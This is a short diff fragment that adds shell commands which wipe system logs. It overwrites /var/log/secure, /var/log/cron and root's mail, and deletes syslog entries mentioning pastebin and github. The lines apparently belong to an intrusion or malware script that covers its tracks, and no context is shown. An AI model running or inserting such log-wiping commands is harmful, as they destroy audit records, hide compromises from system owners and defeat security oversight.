+echo 0>/var/log/secure
+echo 0>/var/log/cron
+echo 0>/var/mail/root
+sed -i '/pastebin/d' /var/log/syslog
+sed -i '/github/d' /var/log/syslog
+
+#
+#
